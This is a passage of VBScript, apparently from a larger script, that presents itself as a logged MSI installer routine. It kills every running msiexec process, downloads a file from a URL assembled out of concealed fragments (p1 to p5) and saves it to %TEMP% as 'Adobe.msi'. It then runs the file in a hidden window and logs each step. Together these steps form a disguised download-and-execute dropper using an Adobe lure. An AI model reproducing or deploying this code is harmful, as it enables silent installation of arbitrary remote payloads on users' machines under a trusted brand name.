' ============================================================
    '  MSI install block — full logging
    ' ============================================================

    Dim diagFile, df
    diagFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\msi_diag.txt"
    Set df = fso.CreateTextFile(diagFile, True)
    df.WriteLine "=== MSI INSTALL DIAG ==="
    df.WriteLine "time     : " & Now
    df.WriteLine "temp     : " & sh.ExpandEnvironmentStrings("%TEMP%")
    df.WriteLine ""

    ' ---- kill any zombie msiexec before install ----
    df.WriteLine "--- STEP 1: KILL ZOMBIE MSIEXEC ---"
    Dim msiKill, msiKillEntry, killCount
    killCount = 0
    On Error Resume Next
    Set msiKill = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
    If Err.Number <> 0 Then
        df.WriteLine "wmi query err: " & Err.Number & " - " & Err.Description
        Err.Clear
    Else
        For Each msiKillEntry In msiKill
            df.WriteLine "found msiexec pid=" & msiKillEntry.ProcessId
            df.WriteLine "  cmdline: " & msiKillEntry.CommandLine
            msiKillEntry.Terminate
            If Err.Number <> 0 Then
                df.WriteLine "  terminate err: " & Err.Number & " - " & Err.Description
                Err.Clear
            Else
                df.WriteLine "  terminated ok"
                killCount = killCount + 1
            End If
        Next
    End If
    On Error GoTo 0
    df.WriteLine "total killed: " & killCount
    df.WriteLine ""

    On Error Resume Next
    sh.Run "%COMSPEC% /c timeout /t 2 /nobreak >nul", 0, True
    If Err.Number <> 0 Then
        df.WriteLine "timeout err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0
    df.WriteLine "waited 2s for mutex release"
    df.WriteLine ""

    ' ---- fetch MSI via WinHTTP ----
    df.WriteLine "--- STEP 2: FETCH MSI ---"
    Dim http, msiUrl, msiPath
    msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
    df.WriteLine "url      : " & msiUrl
    df.WriteLine "dest     : " & msiPath

    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then
        df.WriteLine "create obj err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0

    On Error Resume Next
    http.Open "GET", msiUrl, False
    If Err.Number <> 0 Then
        df.WriteLine "http.open err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0

    On Error Resume Next
    http.Send
    If Err.Number <> 0 Then
        df.WriteLine "http.send err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0

    df.WriteLine "http status : " & http.Status
    df.WriteLine "body len    : " & LenB(http.ResponseBody) & " bytes"
    df.WriteLine ""

    If http.Status = 200 Then
        df.WriteLine "--- STEP 3: SAVE MSI ---"
        Dim stream, saveErr
        saveErr = ""
        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        If Err.Number <> 0 Then
            saveErr = "create stream: " & Err.Number & " - " & Err.Description
            Err.Clear
        End If
        If saveErr = "" Then
            stream.Type = 1
            stream.Open
            stream.Write http.ResponseBody
            stream.SaveToFile msiPath, 2
            If Err.Number <> 0 Then
                saveErr = "save: " & Err.Number & " - " & Err.Description
                Err.Clear
            End If
            stream.Close
        End If
        On Error GoTo 0
        df.WriteLine "save err  : " & saveErr

        If fso.FileExists(msiPath) Then
            df.WriteLine "saved ok  : " & msiPath
            df.WriteLine "saved size: " & fso.GetFile(msiPath).Size
        Else
            df.WriteLine "save FAILED - file not on disk"
        End If
        df.WriteLine ""

        ' ---- run via shell association ----
        df.WriteLine "--- STEP 4: LAUNCH INSTALL ---"
        Dim launchCmd
        launchCmd = Chr(34) & msiPath & Chr(34)
        df.WriteLine "cmd       : " & launchCmd

        On Error Resume Next
        sh.Run launchCmd, 0, False
        If Err.Number <> 0 Then
            df.WriteLine "shell run err: " & Err.Number & " - " & Err.Description
            Err.Clear
        Else
            df.WriteLine "shell run returned cleanly"
        End If
        On Error GoTo 0

        df.WriteLine "waiting 10s for msiexec spawn..."
        sh.Run "%COMSPEC% /c timeout /t 10 /nobreak >nul", 0, True

        Dim checkProcs, checkProc, runningNow
        runningNow = 0
        Set checkProcs = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
        For Each checkProc In checkProcs
            df.WriteLine "msiexec running: pid=" & checkProc.ProcessId
            df.WriteLine "  cmd: " & checkProc.CommandLine
            runningNow = runningNow + 1
        Next
        df.WriteLine "total msiexec after launch: " & runningNow
        df.WriteLine ""
    End If

    df.WriteLine "=== END ==="
    df.Close
